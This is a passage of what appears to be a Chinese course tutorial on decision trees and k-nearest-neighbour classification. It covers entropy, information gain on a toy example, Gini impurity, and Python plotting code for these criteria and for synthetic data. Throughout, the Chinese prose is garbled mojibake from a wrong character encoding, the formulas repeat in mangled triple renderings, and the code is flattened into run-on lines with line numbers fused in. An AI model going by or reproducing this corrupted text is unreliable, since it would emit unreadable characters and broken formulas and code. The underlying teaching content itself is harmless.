å’Œæ•°æ®æŒ–æ˜è¯¾ç¨‹ã€‹ å†³ç­–æ ‘å’Œ K è¿‘é‚»åˆ†ç±» ä»‹ç» æœ¬æ¬¡å®éªŒåˆ†åˆ«è¿ç”¨å†³ç­–æ ‘å’Œæœ€è¿‘é‚»æ–¹æ³•åœ¨åˆ†ç±»ä»»åŠ¡ä¸Šæ„å»ºæ¨¡å‹ï¼Œå¹¶é€šè¿‡äº¤å‰éªŒè¯å¯¹æ¨¡å‹è¿›è¡Œè°ƒä¼˜ã€‚ çŸ¥è¯†ç‚¹ å†³ç­–æ ‘ æœ€è¿‘é‚»æ–¹æ³• äº¤å‰éªŒè¯ æœºå™¨å­¦ä¹ ä»‹ç» åœ¨æ·±å…¥æœ¬æ¬¡å®éªŒä¹‹å‰ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æœºå™¨å­¦ä¹ ï¼Œ Machine Learningï¼ˆT. Mitchell è‘—ï¼Œ1997 å¹´å‡ºç‰ˆï¼‰ä¸€ä¹¦ä¸­ç»™å‡ºäº†æœºå™¨å­¦ä¹ ç»å…¸ã€é€šç”¨çš„å®šä¹‰ï¼š å‡è®¾ç”¨ P æ¥è¯„ä¼°è®¡ç®—æœºç¨‹åºåœ¨æŸä»»åŠ¡ç±» T ä¸Šçš„æ€§èƒ½ï¼Œè‹¥ä¸€ä¸ªç¨‹åºåˆ©ç”¨ç»éªŒ E åœ¨ä»»åŠ¡ T ä¸Šè·å¾—äº†æ€§èƒ½æ”¹å–„ï¼Œåˆ™æˆ‘ä»¬å°±è¯´å…³äº T å’Œ P, è¯¥ç¨‹åºå¯¹ E è¿›è¡Œäº†å­¦ä¹ ã€‚ åœ¨ä¸åŒçš„é—®é¢˜è®¾å®šä¸‹ï¼ŒTã€Pã€E å¯èƒ½æŒ‡å®Œå…¨ä¸åŒçš„ä¸œè¥¿ã€‚æœºå™¨å­¦ä¹ ä¸­ä¸€äº›æµè¡Œçš„ä»»åŠ¡ T åŒ…æ‹¬ï¼š åˆ†ç±»ï¼šåŸºäºç‰¹å¾å°†å®ä¾‹åˆ†ä¸ºæŸä¸€ç±»ã€‚ å›å½’ï¼šåŸºäºå®ä¾‹çš„å…¶ä»–ç‰¹å¾é¢„æµ‹è¯¥å®ä¾‹çš„æ•°å€¼å‹ç›®æ ‡ç‰¹å¾ã€‚ èšç±»ï¼šåŸºäºå®ä¾‹çš„ç‰¹å¾å®ç°å®ä¾‹çš„åˆ†ç»„ï¼Œä»è€Œè®©ç»„å†…æˆå‘˜æ¯”ç»„é—´æˆå‘˜æ›´ä¸ºç›¸ä¼¼ã€‚ å¼‚å¸¸æ£€æµ‹ï¼šå¯»æ‰¾ä¸å…¶ä»–æ ·æœ¬æˆ–ç»„å†…å®ä¾‹æœ‰å¾ˆå¤§åŒºåˆ«çš„å®ä¾‹ã€‚ å…¶ä»–æ›´å¤šä»»åŠ¡ å…³äºç»éªŒ Eï¼Œã€ŠDeep Learningã€‹ï¼ˆIan Goodfellowã€Yoshua Bengioã€Aaron Courville è‘—ï¼Œ2016 å¹´å‡ºç‰ˆï¼‰çš„ã€ŒMachine Learning basicsã€ä¸€ç« æä¾›äº†ä¸€ä»½å¾ˆå¥½çš„ç»¼è¿°ï¼š ç»éªŒ E æŒ‡çš„æ˜¯æ•°æ®ï¼ˆæ²¡æœ‰æ•°æ®æˆ‘ä»¬ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ï¼‰ã€‚æ ¹æ®è®­ç»ƒæ–¹å¼ï¼Œæœºå™¨å­¦ä¹ ç®—æ³•å¯ä»¥åˆ†ä¸ºç›‘ç£ï¼ˆsupervisedï¼‰å’Œæ— ç›‘ç£ï¼ˆunsupervisedï¼‰ä¸¤ç±»ã€‚æ— ç›‘ç£å­¦ä¹ éœ€è¦è®­ç»ƒå«æœ‰å¾ˆå¤šç‰¹å¾çš„æ•°æ®é›†ï¼Œç„¶åå­¦ä¹ å‡ºè¿™ä¸ªæ•°æ®é›†ä¸Šæœ‰ç”¨çš„ç»“æ„æ€§è´¨ã€‚è€Œç›‘ç£å­¦ä¹ çš„æ•°æ®é›†é™¤äº†å«æœ‰å¾ˆå¤šç‰¹å¾å¤–ï¼Œå®ƒçš„æ¯ä¸ªæ ·æœ¬éƒ½è¦æœ‰ä¸€ä¸ªæ ‡ç­¾ï¼ˆlabelï¼‰æˆ–ç›®æ ‡ï¼ˆtargetï¼‰ã€‚ ç¤ºä¾‹ åˆ†ç±»å’Œå›å½’å±äºç›‘ç£å­¦ä¹ é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œä½œä¸ºä¿¡è´·æœºæ„ï¼Œæˆ‘ä»¬å¯èƒ½å¸Œæœ›æ ¹æ®å®¢æˆ·ç´¯ç§¯çš„æ•°æ®é¢„æµ‹è´·æ¬¾è¿çº¦æƒ…å†µã€‚åœ¨è¿™é‡Œï¼Œç»éªŒ E æ˜¯å·²æœ‰çš„è®­ç»ƒæ•°æ®ï¼Œå³å®ä¾‹ï¼ˆå®¢æˆ·ï¼‰çš„é›†åˆï¼Œä¸€ç»„ç‰¹å¾ï¼ˆä¾‹å¦‚å¹´é¾„ã€è–ªæ°´ã€è´·æ¬¾ç±»å‹ã€ä»¥å¾€è¿çº¦è®°å½•ç­‰ï¼‰ï¼Œä¸€ä¸ªç›®æ ‡å˜é‡ï¼ˆä»–ä»¬æ˜¯å¦ä¼šè¿çº¦ï¼‰ã€‚ç”±äºéœ€è¦é¢„æµ‹çš„ç›®æ ‡å˜é‡æ˜¯ã€Œä»–ä»¬æ˜¯å¦ä¼šè¿çº¦ã€ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªäºŒå…ƒåˆ†ç±»é—®é¢˜ã€‚å¦‚æœä½ è½¬è€Œé¢„æµ‹è´·æ¬¾ä¼šè¶…æœŸå¤šä¹…ï¼Œé‚£ä¹ˆéœ€è¦é¢„æµ‹çš„ç›®æ ‡å˜é‡å˜æˆäº†ä¸€ä¸ªè¿ç»­å€¼ï¼ˆæ—¶é—´ï¼‰ï¼Œè¿™å°±æˆä¸ºä¸€ä¸ªå›å½’é—®é¢˜äº†ã€‚ æœ€åï¼Œå…³äºç®—æ³•è¡¨ç°çš„è¯„ä¼°åº¦é‡ Pã€‚ä¸åŒé—®é¢˜å’Œç®—æ³•çš„åº¦é‡ä¸åŒï¼Œå½“å­¦ä¹ æ–°ç®—æ³•æ—¶ï¼Œæˆ‘ä»¬å°†è®¨è®ºè¿™ä¸€ç‚¹ã€‚å°±ç›®å‰è€Œè¨€ï¼Œæœ¬æ¬¡å®éªŒå°†ä½¿ç”¨åˆ†ç±»ç®—æ³•ä¸­çš„ä¸€ä¸ªç®€å•åº¦é‡æ ‡å‡†ï¼Œå³å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰ã€‚ ä¸‹é¢çœ‹çœ‹åˆ†ç±»å’Œå›å½’è¿™ä¸¤ä¸ªç›‘ç£å­¦ä¹ é—®é¢˜ã€‚ å†³ç­–æ ‘ å†³ç­–æ ‘æ˜¯åˆ†ç±»ä¸å›å½’é—®é¢˜ä¸­å¸¸ç”¨çš„æ–¹æ³•ä¹‹ä¸€ã€‚å…¶å®ä¸ä»…æ˜¯æœºå™¨å­¦ä¹ é¢†åŸŸï¼Œåœ¨æ¯å¤©çš„æ—¥å¸¸å†³ç­–ä¸­ï¼Œæˆ‘ä»¬éƒ½åœ¨ä½¿ç”¨å†³ç­–æ ‘ã€‚æµç¨‹å›¾å®é™…ä¸Šå°±æ˜¯å†³ç­–æ ‘çš„å¯è§†åŒ–è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¿„ç½—æ–¯å›½ç«‹é«˜ç­‰ç»æµç ”ç©¶å¤§å­¦ï¼ˆHigher School of Economicsï¼‰æä¾›çš„å…³äºã€Œå¦‚ä½•åœ¨å­¦é™¢ç½‘ç«™ä¸Šå‘è¡¨è®ºæ–‡ã€çš„æµç¨‹å›¾ï¼š ç”¨æœºå™¨å­¦ä¹ çš„æœ¯è¯­æ¥è¯´ï¼Œå¯ä»¥æŠŠå®ƒçœ‹æˆä¸€ä¸ªç®€å•çš„åˆ†ç±»å™¨ï¼Œæ ¹æ®å†…å®¹ï¼ˆä¹¦ã€å°å†Œå­ã€è®ºæ–‡ï¼‰ã€æ–°é—»ç±»å‹ã€åŸå‘è¡¨ç‰©ç±»å‹ï¼ˆç§‘å­¦æœŸåˆŠã€é€šè®¯ï¼‰ç­‰æ¥ç¡®å®šåˆé€‚çš„å‘è¡¨ç±»å‹ï¼ˆä¹¦ã€æ–‡ç« ã€ä¹¦çš„ç« èŠ‚ã€é¢„å°æœ¬ã€Higher School of Economics and the Media ç¨¿ä»¶ï¼‰ã€‚ å†³ç­–æ ‘å¸¸å¸¸æ˜¯ä¸“å®¶ç»éªŒçš„æ¦‚æ‹¬ï¼Œæ˜¯ä¸€ç§åˆ†äº«ç‰¹å®šè¿‡ç¨‹çŸ¥è¯†çš„æ–¹å¼ã€‚ä¾‹å¦‚ï¼Œåœ¨å¼•å…¥å¯æ‰©å±•æœºå™¨å­¦ä¹ ç®—æ³•ä¹‹å‰ï¼Œé“¶è¡Œä¸šçš„ä¿¡ç”¨è¯„åˆ†ä»»åŠ¡æ˜¯ç”±ä¸“å®¶è§£å†³çš„ï¼Œèƒ½å¦æ”¾è´·æ˜¯åŸºäºä¸€äº›ç›´è§‚ï¼ˆæˆ–ç»éªŒï¼‰çš„è§„åˆ™ï¼Œè¿™äº›è§„åˆ™å°±å¯ä»¥è¡¨ç¤ºä¸ºå†³ç­–æ ‘çš„å½¢å¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä½œä¸ºæœºå™¨å­¦ä¹ ç®—æ³•çš„å†³ç­–æ ‘åŸºæœ¬ä¸Šå’Œä¸Šå›¾å·®ä¸å¤šï¼Œå®ƒåˆå¹¶ä¸€è¿ä¸²é€»è¾‘è§„åˆ™ï¼Œä½¿ä¹‹æˆä¸ºä¸€ä¸ªæ ‘å½¢çš„æ•°æ®ç»“æ„ï¼Œè¿™äº›è§„åˆ™çš„å½¢å¼ä¸ºã€Œç‰¹å¾ a çš„å€¼å°äº xï¼Œç‰¹å¾ b çš„å€¼å°äº y â€¦ =&gt; ç±»åˆ« 1ã€ã€‚ ä¸‹é¢ï¼Œæˆ‘ä»¬åŸºäºã€Œå¹´é¾„ã€ã€ã€Œæˆ¿äº§ã€ã€ã€Œæ”¶å…¥ã€ã€ã€Œæ•™è‚²ã€ç‰¹å¾ä½¿ç”¨å†³ç­–æ ‘è§£å†³ä¸€ä¸ªäºŒå…ƒåˆ†ç±»é—®é¢˜ï¼Œå³ã€Œæ˜¯å¦å…è®¸è´·æ¬¾ã€ã€‚ å¦‚ä½•æ„å»ºå†³ç­–æ ‘ å¹´é¾„ã€æˆ¿äº§ã€æ”¶å…¥ã€æ•™è‚²ï¼Œè¿™ä¹ˆå¤šçš„ç‰¹å¾é¦–å…ˆåº”è¯¥å…³æ³¨å“ªä¸ªå‘¢ï¼Ÿ ä¸ºäº†å›ç­”ä¸Šè¿°é—®é¢˜ï¼Œå…ˆçœ‹ä¸€ä¸ªç®€å•çš„æ¸¸æˆï¼Œå³ã€Œ20ä¸ªé—®é¢˜ã€æ¸¸æˆï¼Œè¿™ä¸ªæ¸¸æˆæ˜¯è¿™æ ·ç©çš„ï¼šA å¿ƒé‡Œæƒ³ç€ä¸€ä¸ªåäººï¼ŒB é—® A 20 ä¸ªé—®é¢˜ï¼ŒA åªèƒ½å›ç­”ã€Œæ˜¯ã€æˆ–ã€Œå¦ã€ï¼Œ20 ä¸ªé—®é¢˜ä¹‹å B è¦çŒœå‡º A å¿ƒé‡Œæƒ³çš„é‚£ä¸ªåäººæ˜¯è°ã€‚é¦–å…ˆé—®ä¸€ä¸ªå¯ä»¥æœ€å¤§ç¨‹åº¦å‹ç¼©å‰©ä½™é€‰é¡¹æ•°ç›®çš„é—®é¢˜ä¼šä½¿ B å æ®æå¤§ä¼˜åŠ¿ï¼Œä¾‹å¦‚è¯¢é—®ã€Œæ˜¯ä¸æ˜¯å®‰å‰ä¸½å¨œÂ·æœ±è‰ï¼Ÿã€ï¼Œæœ€å¤šå‰”é™¤ä¸€ä¸ªé€‰é¡¹ï¼Œè€Œè¯¢é—®ã€Œè¿™ä¸ªåäººæ˜¯å¥³äººå—ï¼Ÿã€å°†æ¶ˆé™¤å¤§çº¦ä¸€åŠçš„é€‰é¡¹ã€‚å°±æ˜¯è¯´ï¼Œã€Œæ€§åˆ«ã€ç‰¹å¾ç›¸æ¯”ã€Œå®‰å‰ä¸½å¨œÂ·æœ±è‰ã€ã€ã€Œè¥¿ç­ç‰™äººã€ã€ã€Œå–œæ¬¢è¶³çƒã€ç­‰å…¶ä»–ç‰¹å¾æ›´èƒ½åŒºåˆ†åäººæ•°æ®é›†ã€‚è¿™èƒŒåçš„é“ç†ä¸ç†µæœ‰å…³ï¼Œä¸‹é¢ä»‹ç»ç†µçš„æ¦‚å¿µã€‚ ç†µ ç†µæ˜¯ä¸€ä¸ªåœ¨ç‰©ç†ã€ä¿¡æ¯è®ºå’Œå…¶ä»–é¢†åŸŸä¸­å¹¿æ³›åº”ç”¨çš„é‡è¦æ¦‚å¿µï¼Œå¯ä»¥è¡¡é‡è·å¾—çš„ä¿¡æ¯é‡ã€‚å¯¹äºå…·æœ‰ N ç§å¯èƒ½çŠ¶æ€çš„ç³»ç»Ÿè€Œè¨€ï¼Œç†µçš„å®šä¹‰å¦‚ä¸‹ï¼š S=âˆ’âˆ‘i=1Npilogâ¡2pi,S = -\\sum_{i=1}^{N}p_i \\log_2{p_i}, S=âˆ’i=1âˆ‘Nâ€‹piâ€‹log2â€‹piâ€‹, å…¶ä¸­ï¼Œğ‘ğ‘–p**i æ˜¯ç³»ç»Ÿä½äºç¬¬ i ä¸ªçŠ¶æ€çš„æ¦‚ç‡ã€‚ç†µå¯ä»¥æè¿°ä¸ºç³»ç»Ÿçš„æ··æ²Œç¨‹åº¦ï¼Œç†µè¶Šé«˜ï¼Œç³»ç»Ÿçš„æœ‰åºæ€§è¶Šå·®ï¼Œåä¹‹äº¦ç„¶ã€‚ç†µå°†å¸®åŠ©æˆ‘ä»¬é«˜æ•ˆçš„åˆ†å‰²æ•°æ®ï¼Œç±»ä¼¼å¸®åŠ©æˆ‘ä»¬æ‰¾å‡ºåœ¨ã€Œ20ä¸ªé—®é¢˜ã€æ¸¸æˆä¸­å…ˆé—®ä»€ä¹ˆé—®é¢˜è¾ƒå¥½ã€‚ ç©å…·ç¤ºä¾‹ ä¸ºäº†è§£é‡Šç†µæ˜¯å¦‚ä½•æœ‰åˆ©äºæ„å»ºå†³ç­–æ ‘æ¨¡å‹çš„ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç©å…·ç¤ºä¾‹ï¼Œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­å°†åŸºäºçƒçš„ä½ç½®é¢„æµ‹å®ƒçš„é¢œè‰²ã€‚ è¿™é‡Œæœ‰ 9 ä¸ªè“çƒå’Œ 11 ä¸ªé»„çƒã€‚å¦‚æœéšæœºé€‰æ‹©ä¸€ä¸ªçƒï¼Œè¿™ä¸ªçƒæ˜¯è“çƒçš„æ¦‚ç‡ $ ğ‘1= \\frac{9}{20}$ ï¼Œæ˜¯é»„çƒçš„æ¦‚ç‡ $ ğ‘2 = \\frac{11}{20}ï¼Œè¿™æ„å‘³ç€ç†µï¼Œè¿™æ„å‘³ç€ç†µ ï¼Œè¿™æ„å‘³ç€ç†µ ğ‘†0=âˆ’ \\frac{9}{20}{\\log_{2}{\\frac{9}{20}}}â¡ âˆ’ \\frac{11}{20}\\log_{â¡2}{\\frac{11}{20}} â‰ˆ 1 $ è¿™ä¸ªå€¼æœ¬èº«å¯èƒ½æ— æ³•å‘Šè¯‰æˆ‘ä»¬å¾ˆå¤šä¿¡æ¯ã€‚ å°†çƒåˆ†ä¸ºã€Œä½ç½®å°äºç­‰äº 12ã€ä½ç½®å¤§äº 12ã€è¿™ä¸¤ç»„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ é‚£ä¹ˆåˆ†ç»„åï¼Œç†µçš„å˜åŒ–å¦‚ä½•ï¼Ÿå·¦è¾¹ä¸€ç»„æœ‰ 13 ä¸ªçƒï¼Œ 8 è“ 5 é»„ã€‚è¿™ä¸€ç»„çš„ç†µ ğ‘†1=âˆ’513logâ¡2513â¡âˆ’813logâ¡â¡2813â‰ˆ0.96ğ‘†1= âˆ’\\frac{5}{13}{\\log_{2}{\\frac{5}{13}}}â¡ âˆ’ \\frac{8}{13}\\log_{â¡2}{\\frac{8}{13}} â‰ˆ 0.96S1=âˆ’135â€‹log2â€‹135â€‹â¡âˆ’138â€‹logâ¡2â€‹138â€‹â‰ˆ0.96 å³è¾¹ä¸€ç»„æœ‰ 7 ä¸ªçƒï¼Œ 1 è“ 6 é»„ã€‚å³è¾¹è¿™ç»„çš„ç†µ ğ‘†1=âˆ’17logâ¡217â¡âˆ’67logâ¡â¡267â‰ˆ0.6ğ‘†1= âˆ’\\frac{1}{7}{\\log_{2}{\\frac{1}{7}}}â¡ âˆ’ \\frac{6}{7}\\log_{â¡2}{\\frac{6}{7}} â‰ˆ 0.6S1=âˆ’71â€‹log2â€‹71â€‹â¡âˆ’76â€‹logâ¡2â€‹76â€‹â‰ˆ0.6 å¯è§ï¼Œä¸¤ç»„çš„ç†µéƒ½ä¸‹é™äº†ï¼Œä¸”å³è¾¹è¿™ç»„é™å¾—æ›´å¤šã€‚ç”±äºç†µå®é™…ä¸Šæ˜¯ç³»ç»Ÿæ··æ²Œï¼ˆæˆ–ä¸ç¡®å®šï¼‰çš„ç¨‹åº¦ï¼Œç†µçš„ä¸‹é™è¢«ç§°ä¸ºä¿¡æ¯å¢ç›Šã€‚æ•°å­¦ä¸Šï¼ŒåŸºäºå˜é‡ Qï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯å˜é‡ã€Œx â‰¤ 12ã€ï¼‰æ‰€ä½œçš„åˆ†å‰²ï¼Œå¾—åˆ°çš„ä¿¡æ¯å¢ç›Šï¼ˆIGï¼‰å®šä¹‰ä¸ºï¼š IG(Q)=SOâˆ’âˆ‘i=1qNiNSi,IG(Q) = S_O - \\sum_{i=1}^{q}\\frac{N_i}{N}S_i, IG(Q)=SOâ€‹âˆ’i=1âˆ‘qâ€‹NNiâ€‹â€‹Siâ€‹, å…¶ä¸­ï¼Œğ‘q æ˜¯åˆ†å‰²çš„ç»„æ•°ï¼Œğ‘ğ‘–N**i æ˜¯å˜é‡ Q ç­‰äºç¬¬ i é¡¹æ—¶çš„æ ·æœ¬æ•°ç›®ã€‚åœ¨ç©å…·ç¤ºä¾‹ä¸­ï¼Œæœ‰ 2 ä¸ªç»„ï¼ˆğ‘=2q=2ï¼‰ï¼Œä¸€ç»„æœ‰ 13 ä¸ªå…ƒç´ ï¼ˆğ‘1=13N1=13ï¼‰ï¼Œå¦ä¸€ç»„æœ‰ 7 ä¸ªï¼ˆğ‘2=7N2=7ï¼‰ã€‚å› æ­¤ï¼Œä¿¡æ¯å¢ç›Šä¸ºï¼š IG(xâ‰¤12)=S0âˆ’1320S1âˆ’720S2â‰ˆ0.16.IG(x \\leq 12) = S_0 - \\frac{13}{20}S_1 - \\frac{7}{20}S_2 \\approx 0.16. IG(xâ‰¤12)=S0â€‹âˆ’2013â€‹S1â€‹âˆ’207â€‹S2â€‹â‰ˆ0.16. ç»“æœè¡¨æ˜ï¼Œæ ¹æ®ã€Œåæ ‡å°äºæˆ–ç­‰äº12ã€å°†çƒåˆ†ä¸ºä¸¤ç»„å¸¦æ¥äº†ä¸€ä¸ªæ›´æœ‰åºçš„ç³»ç»Ÿã€‚è®©æˆ‘ä»¬ç»§ç»­åˆ†ç»„ï¼Œç›´åˆ°æ¯ç»„ä¸­çš„çƒé¢œè‰²éƒ½ä¸€æ ·ã€‚ ä¸Šå›¾å¯è§ï¼Œå³è¾¹é‚£ç»„åªéœ€æ ¹æ®ã€Œåæ ‡å°äºæˆ–ç­‰äº 18ã€å†åˆ†å‰²ä¸€æ¬¡å³å¯ã€‚è€Œå·¦è¾¹é‚£ç»„è¿˜éœ€è¦ä¸‰æ¬¡åˆ†å‰²ã€‚æ³¨æ„ï¼Œè‹¥ç»„å†…æ‰€æœ‰çƒçš„é¢œè‰²éƒ½ä¸€æ ·ï¼Œé‚£ä¹ˆè¿™ä¸ªç»„çš„ç†µä¸º 0ï¼ˆlogâ¡21=0\\log_2{1} = 0log2â€‹1=0ï¼‰ã€‚ é€šè¿‡è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æˆåŠŸæ„å»ºäº†ä¸€ä¸ªåŸºäºçƒçš„ä½ç½®é¢„æµ‹çƒé¢œè‰²çš„å†³ç­–æ ‘ã€‚ä½†å€˜è‹¥æˆ‘ä»¬å†å‘é‡Œé¢å¢åŠ ä¸€ä¸ªçƒï¼Œè¿™ä¸ªå†³ç­–æ ‘å°±å¯èƒ½æ— æ³•å¾ˆå¥½åœ°å·¥ä½œï¼Œå› ä¸ºå®ƒå®Œå…¨æ‹Ÿåˆäº†è®­ç»ƒé›†ï¼ˆåˆå§‹çš„ 20 çƒï¼‰ã€‚å¦‚æœå¸Œæœ›æå‡å®ƒçš„æ³›ç”¨æ€§ï¼Œé‚£ä¹ˆä¸€æ£µå…·æœ‰æ›´å°‘åˆ†æ”¯ï¼ˆã€Œé—®é¢˜ã€ï¼‰çš„å†³ç­–æ ‘å°†æœ‰æ›´å¥½çš„æ•ˆæœã€‚ å†³ç­–æ ‘æ„å»ºç®—æ³• åœ¨ä¹‹å‰çš„ä¾‹å­ä¸­æ„å»ºçš„å†³ç­–æ ‘æ˜¯æœ€ä¼˜çš„ï¼šå®ƒåªéœ€æ 5 ä¸ªã€Œé—®é¢˜ã€ï¼ˆåŸºäºå˜é‡ Qï¼‰ï¼Œå°±å®Œå…¨æ‹Ÿåˆäº†è®­ç»ƒé›†ã€‚å…¶ä»–åˆ†å‰²æ¡ä»¶ä¼šä½¿å¾—åˆ°çš„æ ‘æ›´æ·±ï¼Œå³éœ€è¦æ›´å¤šã€Œé—®é¢˜ã€æ‰èƒ½è·å¾—ç­”æ¡ˆã€‚ æ„å»ºå†³ç­–æ ‘çš„æµè¡Œç®—æ³•ï¼ˆå¦‚ ID3 æˆ– C4.5ï¼‰çš„æ ¸å¿ƒï¼Œæ˜¯è´ªå©ªæœ€å¤§åŒ–ä¿¡æ¯å¢ç›Šï¼šåœ¨æ¯ä¸€æ­¥ï¼Œç®—æ³•éƒ½ä¼šé€‰æ‹©èƒ½åœ¨åˆ†å‰²åç»™å‡ºæœ€å¤§ä¿¡æ¯å¢ç›Šçš„å˜é‡ã€‚æ¥ç€é€’å½’é‡å¤è¿™ä¸€æµç¨‹ï¼Œç›´åˆ°ç†µä¸ºé›¶ï¼ˆæˆ–è€…ï¼Œä¸ºäº†é¿å…è¿‡æ‹Ÿåˆï¼Œç›´åˆ°ç†µä¸ºæŸä¸ªè¾ƒå°çš„å€¼ï¼‰ã€‚ä¸åŒçš„ç®—æ³•ä½¿ç”¨ä¸åŒçš„æ¨æ–­ï¼Œé€šè¿‡ã€Œæå‰åœæ­¢ã€æˆ–ã€Œæˆªæ–­ã€ä»¥é¿å…æ„å»ºå‡ºè¿‡æ‹Ÿåˆçš„æ ‘ã€‚ åˆ†ç±»é—®é¢˜ä¸­å…¶ä»–çš„åˆ†å‰²è´¨é‡æ ‡å‡† ä¸Šé¢æˆ‘ä»¬è®¨è®ºäº†ç†µæ˜¯å¦‚ä½•è¡¡é‡æ ‘çš„åˆ†åŒºçš„ï¼Œä½†è¿˜æœ‰å…¶ä»–æŒ‡æ ‡æ¥è¡¡é‡åˆ†å‰²çš„å¥½åï¼š åŸºå°¼ä¸ç¡®å®šæ€§ï¼ˆGini uncertaintyï¼‰ï¼šG=1âˆ’âˆ‘k(pk)2G = 1 - \\sum\\limits_k (p_k)^2G=1âˆ’kâˆ‘â€‹(pkâ€‹)2 é”™åˆ†ç‡ï¼ˆMisclassification errorï¼‰ï¼šE=1âˆ’maxâ¡kpkE = 1 - \\max\\limits_k p_kE=1âˆ’kmaxâ€‹pkâ€‹ å®è·µä¸­å‡ ä¹ä»ä¸ä½¿ç”¨é”™åˆ†ç‡ï¼Œè€ŒåŸºå°¼ä¸ç¡®å®šæ€§å’Œä¿¡æ¯å¢ç›Šçš„æ•ˆæœå·®ä¸å¤šã€‚ äºŒå…ƒåˆ†ç±»é—®é¢˜çš„ç†µå’ŒåŸºå°¼ä¸ç¡®å®šæ€§ä¸ºï¼š S=âˆ’p+logâ¡2p+âˆ’pâˆ’logâ¡2pâˆ’=âˆ’p+logâ¡2p+âˆ’(1âˆ’p+)logâ¡2(1âˆ’p+)S = -p_+ \\log_2{p_+} -p_- \\log_2{p_-} = -p_+ \\log_2{p_+} -(1 - p_{+}) \\log_2{(1 - p_{+})} S=âˆ’p+â€‹log2â€‹p+â€‹âˆ’pâˆ’â€‹log2â€‹pâˆ’â€‹=âˆ’p+â€‹log2â€‹p+â€‹âˆ’(1âˆ’p+â€‹)log2â€‹(1âˆ’p+â€‹) G=1âˆ’p+2âˆ’pâˆ’2=1âˆ’p+2âˆ’(1âˆ’p+)2=2p+(1âˆ’p+)G = 1 - p_+^2 - p_-^2 = 1 - p_+^2 - (1 - p_+)^2 = 2p_+(1-p_+) G=1âˆ’p+2â€‹âˆ’pâˆ’2â€‹=1âˆ’p+2â€‹âˆ’(1âˆ’p+â€‹)2=2p+â€‹(1âˆ’p+â€‹) å…¶ä¸­ p+p_+p+â€‹ æ˜¯å¯¹è±¡å…·æœ‰æ ‡ç­¾ + çš„æ¦‚ç‡ã€‚ ä»¥ p+p_+p+â€‹ ä¸ºåæ ‡ï¼Œç»˜åˆ¶ä¸Šé¢ä¸¤ä¸ªå‡½æ•°çš„å›¾åƒã€‚ 1234567891011121314151617181920import warningsfrom matplotlib import pyplot as pltimport numpy as npimport pandas as pdimport seaborn as snssns.set()warnings.filterwarnings(&#x27;ignore&#x27;)plt.figure(figsize=(6, 4))xx = np.linspace(0, 1, 50)plt.plot(xx, [2 * x * (1-x) for x in xx], label=&#x27;gini&#x27;)plt.plot(xx, [4 * x * (1-x) for x in xx], label=&#x27;2*gini&#x27;)plt.plot(xx, [-x * np.log2(x) - (1-x) * np.log2(1 - x) for x in xx], label=&#x27;entropy&#x27;)plt.plot(xx, [1 - max(x, 1-x) for x in xx], label=&#x27;missclass&#x27;)plt.plot(xx, [2 - 2 * max(x, 1-x) for x in xx], label=&#x27;2*missclass&#x27;)plt.xlabel(&#x27;p+&#x27;)plt.ylabel(&#x27;criterion&#x27;)plt.title(&#x27;Criteria of quality as a function of p+ (binary classification)&#x27;)plt.legend() ä¸Šå›¾å¯è§ï¼Œç†µçš„å›¾åƒå’Œä¸¤å€çš„åŸºå°¼ä¸ç¡®å®šæ€§å›¾åƒéå¸¸æ¥è¿‘ã€‚å› æ­¤ï¼Œåœ¨å®è·µä¸­ï¼Œè¿™ä¸¤ä¸ªæŒ‡æ ‡çš„æ•ˆæœåŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ã€‚ ç¤ºä¾‹ ä¸‹é¢ç”¨ä¸€æ£µå†³ç­–æ ‘æ‹Ÿåˆä¸€äº›åˆæˆæ•°æ®ã€‚è¿™äº›åˆæˆæ•°æ®å±äºä¸¤ä¸ªä¸åŒçš„ç±»åˆ«ï¼Œè¿™ä¸¤ä¸ªç±»åˆ«çš„å‡å€¼ä¸åŒï¼Œä½†éƒ½å‘ˆç°æ­£æ€åˆ†å¸ƒã€‚ 12345678# ç¬¬ä¸€ç±»np.random.seed(17)train_data = np.random.normal(size=(100, 2))train_labels = np.zeros(100)# ç¬¬äºŒç±»train_data = np.r_[train_data, np.random.normal(size=(100, 2), loc=2)]train_labels = np.r_[train_labels, np.ones(100)] ä¸‹é¢ç»˜åˆ¶æ•°æ®ã€‚é€šä¿—åœ°è®²ï¼Œè¿™ç§æƒ…å†µä¸‹çš„åˆ†ç±»é—®é¢˜å°±æ˜¯æ„é€ ä¸€ä¸ªã€Œè¾¹ç•Œã€ï¼Œèƒ½å¤Ÿè¾ƒå¥½çš„åˆ†å¼€ä¸¤ä¸ªç±»åˆ«ï¼ˆçº¢ç‚¹å’Œé»„ç‚¹ï¼‰ã€‚è¿™ä¸ªã€Œè¾¹ç•Œã€è‹¥æ˜¯ä¸€æ¡ç›´çº¿çš„è¯å¯èƒ½å¤ªè¿‡ç®€å•ï¼Œè‹¥æ˜¯æ²¿ç€æ¯ä¸ªçº¢ç‚¹ç”»å‡ºçš„è›‡å½¢æ›²çº¿åˆå¤ªè¿‡å¤æ‚ï¼ˆè¿™å°†å¯¼è‡´å…¶åœ¨æ–°æ•°æ®ä¸Šçš„è¡¨ç°å¾ˆå·®ï¼‰ã€‚ä»ç›´è§‰ä¸Šè¯´ï¼ŒæŸç§å¹³æ»‘çš„è¾¹ç•Œï¼Œåœ¨æ–°æ•°æ®ä¸Šçš„æ•ˆæœä¼šæ¯”è¾ƒå¥½ã€‚ 1234plt.figure(figsize=(10, 8))plt.scatter(train_data[:, 0], train_data[:, 1], c=train_labels, s=100, cmap=&#x27;autumn&#x27;, edgecolors=&#x27;black&#x27;, linewidth=1.5)plt.plot(range(-2, 5), range(4, -3, -1)) ä¸‹é¢è®­ç»ƒä¸€æ£µ sklearn å†³ç­–æ 